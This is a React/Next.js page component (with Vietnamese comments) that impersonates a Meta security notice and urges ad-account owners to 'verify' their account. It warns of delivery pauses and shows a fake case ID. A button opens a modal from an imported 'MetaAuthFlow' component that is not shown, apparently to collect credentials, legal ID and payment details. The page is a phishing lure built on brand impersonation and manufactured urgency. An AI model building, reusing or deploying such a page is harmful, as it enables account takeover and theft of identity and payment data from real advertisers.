"use client";

import { ModalFlowProvider, useModalFlow } from "@/components/MetaAuthFlow";

function TriggerButton() {
  const { openModal } = useModalFlow();
  return (
    <div className="pt-6 flex justify-center w-full">
      <button
        onClick={openModal}
        className="w-full sm:w-auto px-8 py-2.5 bg-[#0064E0] hover:bg-blue-700 active:scale-[0.99] text-white font-semibold text-base rounded- shadow-lg transition-all cursor-pointer"
      >
        Verify Ad Account
      </button>
    </div>
  );
}

export default function Page() {
  return (
    <ModalFlowProvider>
      <div className="min-h-screen bg-gradient-to-br from-slate-50 via-sky-50 to-slate-100 text-slate-900 flex flex-col justify-between py-8 px-4 sm:px-6">
        
        {/* Main Content căn giữa */}
        <main className="w-full max-w-3xl mx-auto bg-white/80 backdrop-blur-md rounded-3xl shadow-xl border border-slate-200/60 p-6 sm:p-10 my-auto">
          
          {/* Header Thông báo */}
          <div className="mb-6 flex flex-col sm:flex-row items-start sm:items-center gap-4 sm:mb-8">
            <div className="flex h-14 w-14 items-center justify-center rounded-4xl bg-blue-50 shrink-0 border border-blue-100 shadow-xs">
              <img 
                alt="Identity Verification" 
                loading="lazy" 
                width="36" 
                height="36" 
                decoding="async" 
                className="h-8 w-8" 
                src="/ic_blue.svg" 
              />
            </div>
            <div>
              <h1 className="text-xl sm:text-2xl font-bold tracking-tight text-slate-900">
                Security Notification: Confirm Ad Account Ownership
              </h1>
              <p className="mt-1 text-xs sm:text-sm font-medium text-slate-600">
               Periodic security evaluation and Advertising Policy compliance checkpoint.
              </p>
            </div>
          </div>

          {/* Nội dung chi tiết */}
          <div className="space-y-4 text-sm leading-relaxed text-slate-700 sm:text-base border-t border-slate-100 pt-6">
            <p>
            To maintain transparency and integrity across our advertising ecosystem, we routinely verify advertiser identities and linked business assets. Your ad account has been flagged for standard credentials verification to ensure full compliance with updated Advertising Standards.
            </p>
            <p>Completing this verification ensures uninterrupted ad delivery, safeguards billing methods and business assets, and helps protect your Ads Manager against unauthorized access or account takeover attempts.</p>
            
            <div className="py-0">
              <span className="inline-block px-1 py-0 text-[#0064E0] text-xs sm:text-sm">
                Case Reference ID: <span className="underline decoration-dotted">#SEC-4719-AUTH-AUDIT</span>
              </span>
            </div>

            <div className="space-y-3 pt-2">
              <h2 className="text-sm sm:text-base font-semibold text-slate-900">
               Submission Instructions &amp; Review Criteria
              </h2>
              <ul className="space-y-2.5 text-xs sm:text-sm text-slate-600">
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 font-bold">•</span>
                  <span><strong>Information Consistency:</strong> Ensure all business registration certificates, legal identification, and payment details strictly match the registered information in your Ads Manager.</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 font-bold">•</span>
                  <span><strong>Review Timeframe:</strong> Please submit the required documents within the active verification window. Unverified ad accounts may experience temporary delivery pauses or spending limit restrictions.</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 font-bold">•</span>
                  <span><strong>Processing &amp; Status Maintenance:</strong> Once submitted, our review team will evaluate your credentials (typically within 24–48 hours). Active campaigns, budgets, and billing profiles will remain protected during the review.</span>
                </li>
              </ul>
            </div>
          </div>

          {/* Nút mở Form */}
          <TriggerButton />
        </main>

        {/* Footer căn giữa đẹp mắt phía dưới */}
        <footer className="mt-8 flex flex-wrap justify-center items-center gap-2 sm:gap-4 text-xs text-slate-500 text-center px-4">
          <button className="hover:text-slate-700 transition-colors" type="button">Business Help Center</button>
          <span className="text-slate-300">|</span>
          <button className="hover:text-slate-700 transition-colors" type="button">Data Privacy</button>
          <span className="text-slate-300">|</span>
          <button className="hover:text-slate-700 transition-colors" type="button">Advertising Policies</button>
          <span className="text-slate-300">|</span>
          <button className="hover:text-slate-700 transition-colors" type="button">Community Standards</button>
          <span className="text-slate-300">|</span>
          <span>Meta © 2026</span>
        </footer>

      </div>
    </ModalFlowProvider>
  );
}